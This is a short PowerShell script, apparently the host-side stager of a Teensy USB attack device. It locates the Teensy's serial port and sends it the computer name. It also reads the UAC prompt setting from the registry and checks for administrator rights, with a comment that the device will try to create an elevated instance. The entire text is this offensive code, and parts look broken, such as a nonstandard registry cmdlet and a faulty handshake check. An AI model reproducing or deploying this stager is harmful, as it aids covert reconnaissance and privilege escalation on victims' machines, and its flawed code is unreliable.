$comport = Get-WmiObject Win32_SerialPort | Select-Object Name,DeviceID,Description | where {$_.Description -like "*Teensy*"} | % {$_.inputobject.DeviceID}
function Run-Stager {
$port=New-Object System.IO.Ports.SerialPort $comport,115200,None,8,one
$port.open()
$port.WriteLine("init")
$resp=$port.ReadLine()
if (-Not $resp -eq "ack") {return}
$port.WriteLine($env:computername)
$port.WriteLine($comport)
$uac=Get-RegistryValue HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System ConsentPromptBehaviorAdmin
Write-Host $uac
$admin=([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] “Administrator”)
$port.WriteLine($admin)
if (-Not $admin) { #teensy will attempt to create elevated instance if not already
  $port.close() #let go of port
  return #in case I decide to add more data return later
}
} Run-Stager

